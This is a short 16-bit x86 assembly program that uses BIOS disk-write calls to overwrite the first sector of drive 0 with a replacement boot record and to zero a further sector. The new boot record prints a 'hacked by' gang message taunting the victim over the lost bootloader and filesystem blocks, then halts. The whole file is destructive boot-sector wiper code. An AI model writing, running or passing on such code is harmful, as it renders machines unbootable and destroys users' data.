org 0x0
use16

endl equ 0xa

; Program that changes the bootloader????

start:
    mov ax, cs
    mov es, ax

    mov ah, 0x3
    mov al, 1
    xor ch, ch
    mov cl, 1
    xor dh, dh
    xor dl, dl
    lea bx, [bootloader]
    int 0x13

    mov ah, 0x3
    mov al, 1
    xor ch, ch
    mov cl, 5
    xor dh, dh
    xor dl, dl
    lea bx, [nun]
    int 0x13

    int 0x24

    push 0x1000
    push 0x0
    retf

bootloader:
    lea si, [0x7c00+(msg-bootloader)]
    mov ah, 0xe
    xor bh, bh
.loop:
    lodsb
    test al, al
    jz halt
    int 0x10
    jmp .loop
halt:
    cli
    hlt

msg db "hacked by southeast hacker gang group association (sehgga)", endl, 0xd, "hope yuo did not needed that bootloader!", endl, 0xd, "(adn that filesystem blocks)", 0

db (bootloader+510)-($-$$) dup(0)
dw 0xaa55

nun db 512 dup(0)